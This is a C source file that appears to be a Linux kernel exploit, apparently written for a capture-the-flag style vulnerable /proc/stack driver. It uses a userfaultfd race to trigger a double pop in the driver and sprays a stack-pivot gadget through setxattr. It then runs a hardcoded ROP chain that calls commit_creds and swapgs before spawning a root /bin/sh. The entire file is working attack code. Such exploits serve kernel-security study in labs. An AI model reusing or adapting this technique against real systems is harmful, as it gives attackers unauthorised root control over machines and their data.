#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <stdlib.h>
#include "src/kstack.h"

#define PAGESIZE 4096

int stackfd;

void get_shell(void) {
        char *arg[] = {"/bin/sh", NULL};
        char *env[] = {NULL};

        if(getuid() == 0) {
                printf("got dat root: %d\n", getuid());
                execve(arg[0], arg, env);
        } else {
                printf("aint got that root\n");
        }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;


void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}



int userfaultfd(int flags) {
	return syscall(SYS_userfaultfd, flags);
}

void *print_mem(void *mem) {
	void *test = (mem + 0x200);
	unsigned long beef = 0xbeefbabedeadbeef;

	char buf[10];
	char addr[0x20];
	
	printf("before fault\n");
	printf("beef: %p\n", &beef);
	//[2] case fault by passing argument associated with memory area registered with uffd
	
	//save_state();

	if(ioctl(stackfd, CMD_POP, test) < 0) {
		printf("failed pop (fault) but let's continue....\n");
		//return NULL;
	}
	printf("fault handled, second pop completed\n");
	
	int statfd = open("/proc/self/stat", O_RDONLY);
	if(statfd == -1) {
		printf("failed to open stat\n");
		return NULL;
	}
	/*if(ioctl(stackfd, CMD_PUSH, &test) < 0) {
                printf("failed pop (fault)\n");
                return NULL;
        }*/

	
	/*if(ioctl(stackfd, CMD_PUSH, &beef) < 0) {
                printf("failed push after fault\n");
                return NULL;
        }*/
	for(int i=0;i<4;i++) {
		*(unsigned long *)(addr + (i*8)) = 0xffffffff8105832b; //stack pivy
	}
	
	int setx = setxattr("/", "filee", addr, 0x20, 0);
	if(setx < 0) {
		perror("setxattr failed\n");
		//return NULL;
	}

	//save_state();

	printf("PUSH initiated twice, should point to same mem location\n");
	read(statfd, buf, sizeof(buf));

	return NULL;
}

int main (int argc, char *argv[]) {
	int return_code = 0;
	int push_count = 1;
	unsigned long arg;
	unsigned long *rop;

	void *mm = mmap(0x83c38000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); 	
	if(mm == (void *)-1) {
		perror("mmap failed: ");
		goto err_cleanup;
	}

	save_state();
	printf("get_shell addr: %lx\n", user_rip);
	
	rop = (unsigned long *)0x83c389c0;
	*rop++ = 0xffffffff81034505; //pop rdi
	*rop++ = 0x0;			     
	*rop++ = 0xffffffff81069e00;
	*rop++ = 0xffffffff8121f89a;
	*rop++ = 0x0;
	*rop++ = 0xffffffff81069c10; //commit_creds
	*rop++ = 0xffffffff81600a34+0x16; //swapgs
	*rop++ = 0x0;
	*rop++ = 0x0;
	*rop++ = (unsigned long)get_shell;
        *rop++ = user_cs;
        *rop++ = user_rflags;
        *rop++ = user_sp;
        *rop++ = user_ss;	

	stackfd = open("/proc/stack", O_RDONLY);
	if(stackfd == -1) {
		goto err_cleanup;
	}

	//[1] setup initial stack
	arg = 0xdeadbeef;
	for(int i=0;i<push_count;i++) {
		printf("push: %d\n", i);
		if(ioctl(stackfd, CMD_PUSH, &arg) < 0) {
			fprintf(stderr, "proc_ioctl failed\n");
			goto err_cleanup;
		}
	}

	/*
	if(ioctl(stackfd, CMD_POP, &arg) < 0) {
		fprintf(stderr, "true pop failed\n");
		goto err_cleanup;
	}
	printf("true pop: %lx\n", arg);
	*/

	int fd = 0;
	if((fd = userfaultfd(O_NONBLOCK)) == -1) {
		fprintf(stderr, "userfaultd syscall failed: %m\n");
		goto err_cleanup;
	}

	struct uffdio_api api = { .api = UFFD_API };
	if(ioctl(fd, UFFDIO_API, &api)) {
		fprintf(stderr, "uffd api ioctl failed: %m\n");
		goto err_cleanup;
	}

	if(api.api != UFFD_API) {
		fprintf(stderr, "UFFD API mismatch\n");
		goto err_cleanup;
	}

	void *pages = NULL;
	if((pages = mmap(NULL, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
		fprintf(stderr, "mmapp failed: %m\n");
		goto err_cleanup;
	}


	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (unsigned long long)pages,
			.len = PAGESIZE
		}
	};
	
	if(ioctl(fd, UFFDIO_REGISTER, &reg)) {
		fprintf(stderr, "uffd register ioctl failed: %m\n");
		goto err_cleanup;
	}

	

	printf("uffdio_register ioctls = 0x%llx\n", reg.ioctls);
	printf("UFFD_API_RANGE_IOCTLS = 0x%llx\n", UFFD_API_RANGE_IOCTLS);
	if(reg.ioctls != UFFD_API_RANGE_IOCTLS) {
		fprintf(stderr, "UFFD ioctls mismatch\n");
		//goto err_cleanup;
	}


	pthread_t thread = {0};
	if(pthread_create(&thread, NULL, print_mem, pages)) {
		fprintf(stderr, "pthread_create failed: %m\n");
		goto err_cleanup;
	}

	char data[PAGESIZE] = "handled page fault.\n";

	int pollret = 0;
	struct pollfd evt = {.fd = fd, .events = POLLIN};
	while((pollret = (poll(&evt, 1, 25))) > 0) {
		printf("keep polling\n");
		
		if(evt.revents & POLLERR) {
			fprintf(stderr, "POLLERR\n");
			goto err_cleanup;
		} else if (evt.revents & POLLHUP) {
			fprintf(stderr, "POLLHUP\n");
			goto err_cleanup;
		}
		
		if (!(evt.revents & POLLIN))
			continue;
		
		struct uffd_msg fault_msg = {0};
                if (read(fd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
                        fprintf(stderr, "read failed: %m\n");
                        goto err_cleanup;
                }
				
		if (fault_msg.event & UFFD_EVENT_PAGEFAULT) {
			printf("we be faultinnnn\n");

			//[3] this should get executed when thread is paused...
			unsigned long leak;
			if(ioctl(stackfd, CMD_POP, &leak) < 0) {
				fprintf(stderr, "pop failed\n");
				goto err_cleanup;
			}

			printf("pop in fault handler\n");
			//getchar();

			char *place = (char *)fault_msg.arg.pagefault.address;
			if(fault_msg.event != UFFD_EVENT_PAGEFAULT) {
				fprintf(stderr, "unexpected page fault\n");
				goto err_cleanup;
			}
		
			struct uffdio_copy copy = {
				.dst = (long) place,
				.src = (long) data,
				.len = PAGESIZE
			};

			if(ioctl(fd, UFFDIO_COPY, &copy)) {
				fprintf(stderr, "uffd copy failed: %m\n");
				goto err_cleanup;
			}
		}
	}
	printf("poll return: %d\n", pollret);
	getchar();
	goto cleanup;

err_cleanup:
	return_code = 1;
cleanup:
	if(fd) close(fd);
	if(stackfd) close(stackfd);
	return return_code;

}
